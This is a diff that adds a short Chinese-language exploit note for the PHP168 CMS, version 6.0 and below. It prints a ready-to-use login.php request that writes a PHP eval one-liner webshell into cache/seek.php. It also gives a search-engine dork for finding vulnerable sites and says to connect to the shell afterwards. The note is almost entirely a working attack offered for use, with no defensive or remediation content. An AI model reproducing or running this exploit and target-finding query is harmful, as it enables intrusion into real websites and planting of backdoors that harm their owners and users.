@@ -1,0 +1,17 @@
+PHP168 6.0及以下版本漏洞及利用
+
+影响版本：PHP168 6.0以下版本
+
+入侵者可以在用户登陆页面构造特殊语句，将PHP一句话写入cache目录，从而获得使用PHP168整站程序网站的WEBSHELL权限。
+
+测试语句：
+
+login.php?makehtml=1&chdb[htmlname]=seek.php&chdb[path]=cache&content=<?php%20@eval($_POST[s]);?>
+
+
+shell位置 cache/seek.php
+
+搜索关键字 ： Powered by PHP168 V4.0 Code 2003-07 PHP168CMS
+
+再用一句话连接！
+
